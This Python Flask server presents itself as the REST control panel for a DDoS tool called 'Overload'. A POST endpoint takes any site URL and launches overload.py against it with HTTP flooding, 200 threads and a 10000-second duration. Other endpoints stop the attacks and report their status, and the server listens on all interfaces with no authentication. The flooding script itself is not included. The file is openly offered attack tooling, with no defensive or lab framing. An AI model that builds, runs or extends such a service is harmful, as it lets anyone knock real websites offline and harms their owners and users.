#!/usr/bin/env python3
"""
API Server for Overload Attack Tool
Provides REST endpoints to start and stop DDoS attacks
"""

import os
import sys
import subprocess
import signal
import psutil
from flask import Flask, jsonify, request, send_from_directory, render_template_string
from threading import Lock
import time

app = Flask(__name__, static_folder='static')

# Global variables to track running processes
running_processes = {}
process_lock = Lock()

def kill_process_tree(pid):
    """Kill a process and all its children"""
    try:
        parent = psutil.Process(pid)
        children = parent.children(recursive=True)
        
        # Kill children first
        for child in children:
            try:
                child.kill()
            except psutil.NoSuchProcess:
                pass
        
        # Kill parent
        try:
            parent.kill()
        except psutil.NoSuchProcess:
            pass
            
        # Wait for processes to terminate
        gone, alive = psutil.wait_procs(children + [parent], timeout=3)
        
        # Force kill any remaining processes
        for p in alive:
            try:
                p.kill()
            except psutil.NoSuchProcess:
                pass
                
        return True
    except psutil.NoSuchProcess:
        return True
    except Exception as e:
        print(f"Error killing process tree: {e}")
        return False

@app.route('/api/attack/<path:site_url>', methods=['POST'])
def start_attack(site_url):
    """Start an attack on the specified site URL"""
    try:
        with process_lock:
            # Check if there's already an attack running
            if running_processes:
                return jsonify({
                    'status': 'error',
                    'message': 'An attack is already running. Stop it first before starting a new one.',
                    'running_targets': list(running_processes.keys())
                }), 400
            
            # Validate URL format (basic validation)
            if not site_url or len(site_url.strip()) == 0:
                return jsonify({
                    'status': 'error',
                    'message': 'Invalid site URL provided'
                }), 400
            
            # Prepare the command
            script_path = os.path.join(os.path.dirname(__file__), 'overload.py')
            cmd = [
                sys.executable,
                script_path,
                '--target', site_url,
                '--method', 'http',
                '--time', '10000',
                '--threads', '200'
            ]
            
            # Start the process
            try:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd=os.path.dirname(__file__)
                )
                
                # Store the process
                running_processes[site_url] = {
                    'process': process,
                    'pid': process.pid,
                    'start_time': time.time(),
                    'command': ' '.join(cmd)
                }
                
                return jsonify({
                    'status': 'success',
                    'message': f'Attack started on {site_url}',
                    'pid': process.pid,
                    'target': site_url,
                    'method': 'http',
                    'duration': 10000,
                    'threads': 200
                }), 200
                
            except Exception as e:
                return jsonify({
                    'status': 'error',
                    'message': f'Failed to start attack: {str(e)}'
                }), 500
                
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Internal server error: {str(e)}'
        }), 500

@app.route('/api/attack/stop', methods=['POST'])
def stop_attack():
    """Stop all running attacks"""
    try:
        with process_lock:
            if not running_processes:
                return jsonify({
                    'status': 'info',
                    'message': 'No attacks are currently running'
                }), 200
            
            stopped_targets = []
            failed_targets = []
            
            # Stop all running processes
            for target, proc_info in list(running_processes.items()):
                try:
                    pid = proc_info['pid']
                    
                    # Kill the process tree
                    if kill_process_tree(pid):
                        stopped_targets.append(target)
                        del running_processes[target]
                    else:
                        failed_targets.append(target)
                        
                except Exception as e:
                    print(f"Error stopping attack on {target}: {e}")
                    failed_targets.append(target)
            
            if failed_targets:
                return jsonify({
                    'status': 'partial_success',
                    'message': f'Some attacks could not be stopped',
                    'stopped': stopped_targets,
                    'failed': failed_targets
                }), 207
            else:
                return jsonify({
                    'status': 'success',
                    'message': 'All attacks stopped successfully',
                    'stopped': stopped_targets
                }), 200
                
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Internal server error: {str(e)}'
        }), 500

@app.route('/api/attack/status', methods=['GET'])
def attack_status():
    """Get the status of running attacks"""
    try:
        with process_lock:
            if not running_processes:
                return jsonify({
                    'status': 'success',
                    'message': 'No attacks are currently running',
                    'running_attacks': []
                }), 200
            
            # Check which processes are still alive
            active_attacks = []
            dead_processes = []
            
            for target, proc_info in list(running_processes.items()):
                try:
                    process = proc_info['process']
                    if process.poll() is None:  # Process is still running
                        active_attacks.append({
                            'target': target,
                            'pid': proc_info['pid'],
                            'start_time': proc_info['start_time'],
                            'duration': time.time() - proc_info['start_time']
                        })
                    else:
                        dead_processes.append(target)
                except Exception:
                    dead_processes.append(target)
            
            # Clean up dead processes
            for target in dead_processes:
                if target in running_processes:
                    del running_processes[target]
            
            return jsonify({
                'status': 'success',
                'message': f'{len(active_attacks)} attack(s) currently running',
                'running_attacks': active_attacks
            }), 200
            
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Internal server error: {str(e)}'
        }), 500

@app.route('/')
def index():
    """Serve the main interface"""
    return send_from_directory('static', 'index.html')

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'success',
        'message': 'API server is running',
        'version': '1.0.0'
    }), 200

@app.errorhandler(404)
def not_found(error):
    return jsonify({
        'status': 'error',
        'message': 'Endpoint not found'
    }), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({
        'status': 'error',
        'message': 'Internal server error'
    }), 500

if __name__ == '__main__':
    # Get host and port from environment variables (Replit compatibility)
    host = os.environ.get('HOST', '0.0.0.0')
    port = int(os.environ.get('PORT', 5000))
    
    print("Starting Overload API Server...")
    print("Available endpoints:")
    print("  POST /api/attack/<site_url> - Start attack on target")
    print("  POST /api/attack/stop - Stop all running attacks")
    print("  GET  /api/attack/status - Get status of running attacks")
    print("  GET  /api/health - Health check")
    print(f"\nServer running on http://{host}:{port}")
    
    # For Replit webview compatibility
    app.run(host=host, port=port, debug=False, threaded=True)